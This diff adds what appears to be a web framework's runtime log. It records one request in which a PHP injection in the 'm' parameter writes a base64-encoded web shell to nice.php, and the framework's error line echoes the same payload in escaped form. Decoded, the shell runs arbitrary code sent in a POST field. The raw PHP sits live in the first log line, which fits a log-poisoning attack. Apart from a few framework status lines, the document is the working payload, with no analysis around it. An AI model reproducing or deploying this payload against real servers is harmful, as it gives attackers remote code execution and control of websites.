@@ -1,0 +1,6 @@
+[ 2022-01-10T00:33:04+08:00 ] 156.234.42.163 /index.php?m=--><?=file_put_contents("nice.php",base64_decode("PD9waHAgY2xhc3MgeHsgcHVibGljIGZ1bmN0aW9uIGlwKCl7ICRjPSAiICRfUE9TVFtyaW5nb10iOyByZXR1cm4gJGM7IH0gfSAkYyA9IG5ldyB4KCk7ICRiID0gJGMgLT4gaXAoKTsgZXZhbCgkYik7IHByaW50KG1kNSgiUmluZ28iKSk7Pz4="));?>
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000031s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000531s ]
+ERR: 无法加载模块:--&gt;&lt;?=file_put_contents(&quotnice.php&quot,base64_decode(&quotPD9waHAgY2xhc3MgeHsgcHVibGljIGZ1bmN0aW9uIGlwKCl7ICRjPSAiICRfUE9TVFtyaW5nb10iOyByZXR1cm4gJGM7IH0gfSAkYyA9IG5ldyB4KCk7ICRiID0gJGMgLT4gaXAoKTsgZXZhbCgkYik7IHByaW50KG1kNSgiUmluZ28iKSk7Pz4=&quot))?&gt;
+
